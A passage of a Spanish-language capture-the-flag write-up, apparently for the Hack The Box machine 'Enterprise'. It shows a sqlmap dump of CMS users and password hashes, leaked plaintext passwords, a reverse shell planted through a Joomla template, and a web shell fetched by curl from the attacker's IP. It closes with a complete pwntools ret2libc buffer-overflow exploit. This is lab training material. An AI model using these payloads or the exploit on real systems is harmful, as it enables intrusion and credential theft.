</span></span><span style="display:flex;"><span>| otpKey        | varchar<span style="color:#f92672">(</span>1000<span style="color:#f92672">)</span> |
</span></span><span style="display:flex;"><span>| params        | text          |
</span></span><span style="display:flex;"><span>| password      | varchar<span style="color:#f92672">(</span>100<span style="color:#f92672">)</span>  |
</span></span><span style="display:flex;"><span>| registerDate  | datetime      |
</span></span><span style="display:flex;"><span>| requireReset  | tinyint<span style="color:#f92672">(</span>4<span style="color:#f92672">)</span>    |
</span></span><span style="display:flex;"><span>| resetCount    | int<span style="color:#f92672">(</span>11<span style="color:#f92672">)</span>       |
</span></span><span style="display:flex;"><span>| sendEmail     | tinyint<span style="color:#f92672">(</span>4<span style="color:#f92672">)</span>    |
</span></span><span style="display:flex;"><span>| username      | varchar<span style="color:#f92672">(</span>150<span style="color:#f92672">)</span>  |
</span></span><span style="display:flex;"><span>+---------------+---------------+
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ sqlmap -u <span style="color:#e6db74">&#39;http://enterprise.htb/wp-content/plugins/lcars/lcars_db.php?query=1&#39;</span> --dbs --batch -dbms mysql -D joomladb -T edz2g_users --columns -C email,name,username,password --dump
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>+--------------------------------+------------+-----------------+--------------------------------------------------------------+
</span></span><span style="display:flex;"><span>| email                          | name       | username        | password                                                     |
</span></span><span style="display:flex;"><span>+--------------------------------+------------+-----------------+--------------------------------------------------------------+
</span></span><span style="display:flex;"><span>| geordi.la.forge@enterprise.htb | Super User | geordi.la.forge | $2y$10$cXSgEkNQGBBUneDKXq9gU.8RAf37GyN7JIrPE7us9UBMR9uDDKaWy |
</span></span><span style="display:flex;"><span>| guinan@enterprise.htb          | Guinan     | Guinan          | $2y$10$90gyQVv7oL6CCN8lF/0LYulrjKRExceg2i0147/Ewpb6tBzHaqL2q |
</span></span><span style="display:flex;"><span>+--------------------------------+------------+-----------------+--------------------------------------------------------------+
</span></span></code></pre></div><p>Ahora aremos lo mismo con la base de datos <code>wordpress</code>, y sacaremos esto:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>+----+------------------------------+---------------+------------------------------------+
</span></span><span style="display:flex;"><span>| <span style="color:#ae81ff">1</span>  | william.riker@enterprise.htb | william.riker | $P$BFf47EOgXrJB3ozBRZkjYcleng2Q.2. |
</span></span><span style="display:flex;"><span>+----+------------------------------+---------------+------------------------------------+
</span></span></code></pre></div><p>Podemos intentar deshashear las contraseñas con John pero no conseguiremos nada, en este punto  podemos continuar buscando por las bases de datos, hasta encontrar una tabla en la base de datos <code>wodpress</code> que se llama <code>wp_posts</code> si vemos toda la información de los posts de esa tabla y acabaremos viendo un post interesante</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Needed somewhere to put some passwords quickly<span style="color:#ae81ff">\r\n\r\n</span>ZxJyhGem4k338S2Y<span style="color:#ae81ff">\r\n\r\n</span>enterprisencc170<span style="color:#ae81ff">\r\n\r\n</span>ZD3YxfnSjezg67JZ<span style="color:#ae81ff">\r\n\r\n</span>u*Z14ru0p#ttj83zS6<span style="color:#ae81ff">\r\n\r\n</span> <span style="color:#ae81ff">\r\n\r\n</span>   
</span></span></code></pre></div><p>Si lo ponemos mas bonito veremos que tenemos varias <code>contraseñas</code>, que en conjunto con los usuarios que hemos encontrado tenemos la posibilidad de probar</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>Needed somewhere to put some passwords quickly ZxJyhGem4k338S2Y enterprisencc170 ZD3YxfnSjezg67JZ u*Z14ru0p#ttj83zS6   
</span></span></code></pre></div><h2 id="joomla">Joomla Exploitation</h2>
<p>Encontraremos que en el <code>Joomla</code> (la web que esta en el puerto 8080) tiene un /admin y funcionara esta combinación</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>geordi.la.forge : ZD3YxfnSjezg67JZ
</span></span></code></pre></div><p>Perfecto una vez dentro del panel de administración podemos conseguir una reverse shell de la manera típica en el Joomla, nos vamos a Templates y modificamos el que este en uso, el <code>error.php</code>, ahi introducimos el comando en php que queramos, como la reverse shell, nos ponemos en escucha con <code>net-cat</code> y guardamos</p>
<p><img src="/htb/Enterprise/images/9.png" alt="Enterprise"></p>
<p>Al introducir una pagina que no existe nos saldrá la pagina de error y se ejecutara el comando por lo que recibiremos la reverse shell en nuestro equipo</p>
<p><img src="/htb/Enterprise/images/10.png" alt="Enterprise"></p>
<p><img src="/htb/Enterprise/images/11.png" alt="Enterprise"></p>
<h2 id="user">User Escalation</h2>
<p>Tenemos la shell, pero podemos ver que estamos en un <code>contenedor</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ hostname -I
</span></span></code></pre></div><p>Si nos ponemos a investigar veremos que en el <code>/var/www/html</code> hay un directorio <code>/files</code></p>
<p>El cual tiene lo mismo que tenia el servidor de Apache en su <code>/files</code>, por lo que podemos pensar que hay una montura a la maquina principal en ese directorio</p>
<p><img src="/htb/Enterprise/images/12.png" alt="Enterprise"></p>
<p>Gracias a esto podemos introducir un archivo php en este directorio que nos de una reverse shell al visualizarlo (en mi caso estoy usando p0wny-shell ya que se ve mas bonito)</p>
<p>Repositorio de la p0wny-shell &ndash;&gt; <a href="https://github.com/flozz/p0wny-shell">https://github.com/flozz/p0wny-shell</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ curl http://10.10.14.18/shell.php -o ./shell.php
</span></span></code></pre></div><p>Visualizamos el archivo desde la maquina <code>Apache</code></p>
<p><img src="/htb/Enterprise/images/13.png" alt="Enterprise"></p>
<p><img src="/htb/Enterprise/images/14.png" alt="Enterprise"></p>
<p>Vale, ahora nos volvemos a mandar la reverse shell para ganar acceso a la maquina principal</p>
<p><img src="/htb/Enterprise/images/15.png" alt="Enterprise"></p>
<h2 id="bof">BoF - Ret2libc</h2>
<p>Ahora que tenemos acceso a la maquina principal recordamos que en el puerto <code>32812</code> había una aplicación personalizada, podemos buscar si hay algún binario con el nombre de lcars</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ find / -iname lcars 2&gt;/dev/null
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>/etc/xinetd.d/lcars
</span></span><span style="display:flex;"><span>/bin/lcars
</span></span></code></pre></div><p>Tenemos al binario, podemos descargarnoslo y ejecutarlo para ver si es el mismo que corre en el puerto <code>32812</code></p>
<p><img src="/htb/Enterprise/images/16.png" alt="Enterprise"></p>
<p>Efectivamente es el mismo, pero nos pied una contraseña, podemos usar ltrace para ver si hace la comparación sin ofuscar a nivel de código</p>
<p><img src="/htb/Enterprise/images/17.png" alt="Enterprise"></p>
<p>Perfecto, tenemos la contraseña si la usamos nos saldrá un menu, podemos probar a meter muchas &ldquo;A&rdquo; en los campos a ver si sale algun error</p>
<p><img src="/htb/Enterprise/images/18.png" alt="Enterprise"></p>
<p>Perfecto, nos sale que hay un error al meternos en el menu 4 e insertar muchas &ldquo;A&rdquo; en el input, ahora podemos intentar con <code>gdb-peda</code> ver si tiene algún factor de seguridad desactivado</p>
<p>Repositorio de peda &ndash;&gt; <a href="https://github.com/longld/peda">https://github.com/longld/peda</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ gdb ./lcars -q
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ gdb-peda$ checksec
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>CANARY    : disabled
</span></span><span style="display:flex;"><span>FORTIFY   : disabled
</span></span><span style="display:flex;"><span>NX        : disabled
</span></span><span style="display:flex;"><span>PIE       : ENABLED
</span></span><span style="display:flex;"><span>RELRO     : Partial
</span></span></code></pre></div><p>Vemos que el <code>PIE</code> esta activado por lo que no nos sera posible hacer un BoF stack-based, pero como no tiene el <code>NX</code> activado podemos intentar un ret2libc</p>
<p>En el ret2libc lo que hacemos es sobrescribir el EIP para que apunte a la dirección del system para que después apunte a la dirección del exit y finalmente a una dirección con la string /bin/sh</p>
<p>Seria algo como esto: EIP &ndash;&gt; System() &ndash;&gt; Exit &ndash;&gt; /bin/sh</p>
<p>Empezamos con lo bueno, primero vamos a calcular el offset hasta el <code>EIP</code> (el numero de caracteres que necesitamos para sobrescribir el EIP), para esto usaremos el pattern create de <code>gdb-peda</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ gdb-peda$ pattern create <span style="color:#ae81ff">1000</span>
</span></span></code></pre></div><p>E introduciremos este patron en vez de las &ldquo;A&rdquo;</p>
<p><img src="/htb/Enterprise/images/19.png" alt="Enterprise"></p>
<p>Con el comparador podemos ver el offset</p>
<pre tabindex="0"><code>❯ gdb-peda$ pattern offset %$A%

%$A% found at offset: 212
</code></pre><p>Tenemos el offset, ahora hay que descubrir las direcciones del <code>system</code>, <code>exit</code> y el <code>sh</code></p>
<p>Para ver la dirección del system tendremos que ejecutar gdb (en la maquina Enterprise) Tenemos primero que listar las funciones</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ <span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> info functions
</span></span></code></pre></div><p>Ahora tenemos que crear un brake point en la función main</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>❯ <span style="color:#f92672">(</span>gdb<span style="color:#f92672">)</span> b *main
</span></span></code></pre></div><p>Ejecutamos el programa <code>(gdb) r</code>  y listamos la función system</p>
<p><img src="/htb/Enterprise/images/20.png" alt="Enterprise"></p>
<p>Haremos lo mismo para el exit</p>
<p><img src="/htb/Enterprise/images/21.png" alt="Enterprise"></p>
<p>Perfecto, ahora solo nos falta el string con el sh, para esto solo tendremos que ejecutar <code>find &amp;system,+9999999,&quot;sh&quot;</code> (cualquiera de las direcciones nos sirven)</p>
<p><img src="/htb/Enterprise/images/22.png" alt="Enterprise"></p>
<p>Ahora tenemos todo lo necesario, por lo que podemos montar el script (recordando que las direcciones tienen que estar en little endian, y todo en formato bytes para que python3 no pete), yo lo hice de esta manera</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## BoF Creation</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">212</span>
</span></span><span style="display:flex;"><span>before_eip <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> offset
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Fsystem <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xf7e4c060</span>) 
</span></span><span style="display:flex;"><span>Fexit <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xf7e3faf0</span>)
</span></span><span style="display:flex;"><span>Fshell <span style="color:#f92672">=</span> p32(<span style="color:#ae81ff">0xf7f6ddd5</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> before_eip <span style="color:#f92672">+</span> Fsystem <span style="color:#f92672">+</span> Fexit <span style="color:#f92672">+</span> Fshell
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context(os<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;linux&#39;</span>, arch<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;i386&#39;</span>)
</span></span><span style="display:flex;"><span>host, port <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;10.10.10.61&#34;</span>, <span style="color:#ae81ff">32812</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## Conection to the machine</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r <span style="color:#f92672">=</span> remote(host, port)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## Recive and sending data</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter Bridge Access Code:&#34;</span>)
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;picarda1&#34;</span>)
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Waiting for input:&#34;</span>)
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter Security Override:&#34;</span>)
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>time<span style="color:#f92672">.</span>sleep(<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">## spawn the shell</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>r<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p>Con esto si ejecutamos el script veremos como ganamos acceso a la maquina como el usuario root</p>

    </section>
</article>
<br>
<br>
<section class="read-more">
    
    <div class="read-more-item">
        <span class="read-more-item-dim">Recent</span>
        <h2 class="post-list__post-title post-title"><a href="/htb/2023/07/htb-bankrobber/" title="link to HTB - Bankrobber">HTB - Bankrobber</a></h2>
        <p class="excerpt">Resolucion de la maquina Bankrobber - Insane</p>
        <div class="post-list__meta">
            <time datetime=" 2023-05-01 07:28:17 &#43;0800" class="post-list__meta--date date">2023-07-04</time>
             <span class="post-list__meta--tags tags">   • <a href="https://rug4lo.github.io/tags/blind-xss-injection">Blind XSS Injection</a>   • <a href="https://rug4lo.github.io/tags/cookie-hijacking">Cookie hijacking</a>   • <a href="https://rug4lo.github.io/tags/sqli">SQLI</a>   • <a href="https://rug4lo.github.io/tags/stealing-net-ntlmv2-hash">Stealing Net-NTLMv2 Hash</a>   • <a href="https://rug4lo.github.io/tags/rce">RCE</a>   • <a href="https://rug4lo.github.io/tags/abusing-a-custom-binary">Abusing a custom binary</a>  </span> 
        </div>
    </div>
    


    
    <div class="read-more-item">
        <span class="read-more-item-dim">Recent</span>
        <h2 class="post-list__post-title post-title"><a href="/htb/2023/03/htb-jupiter/" title="link to HTB - Jupiter">HTB - Jupiter</a></h2>
        <p class="excerpt">Resolucion de la maquina Jupiter - Medium</p>
        <div class="post-list__meta">
            <time datetime=" 2023-05-01 07:28:17 &#43;0800" class="post-list__meta--date date">2023-03-03</time>
             
            <span class="post-list__meta--tags tags"> 
                  • <a href="https://rug4lo.github.io/tags/postgresql-query-exploitation">PostgreSQL Query Exploitation</a>   • <a href="https://rug4lo.github.io/tags/multiple-privilege-escalation">Multiple Privilege Escalation</a>  
            </span>
            
        </div>
    </div>
    
 </section>
  
<br>

        <section class="footer">
    <footer>
        <span class="footer__copyright"> © 2024 - Rug4lo </span>
    </footer>
</section>

    </div>
  </div>

  <script type="text/javascript" src="//code.jquery.com/jquery-1.11.3.min.js"></script>
<script type="text/javascript" src="/js/main.js"></script><script>
    (function(i, s, o, g, r, a, m) {
        i['GoogleAnalyticsObject'] = r;
        i[r] = i[r] || function() {
            (i[r].q = i[r].q || []).push(arguments)
        }, i[r].l = 1 * new Date();
        a = s.createElement(o),
            m = s.getElementsByTagName(o)[0];
        a.async = 1;
        a.src = g;
        m.parentNode.insertBefore(a, m)
    })(window, document, 'script', '//www.google-analytics.com/analytics.js', 'ga');
    ga('create', 'your_ga_id', 'your_host');
    ga('send', 'pageview');
</script>


</body>

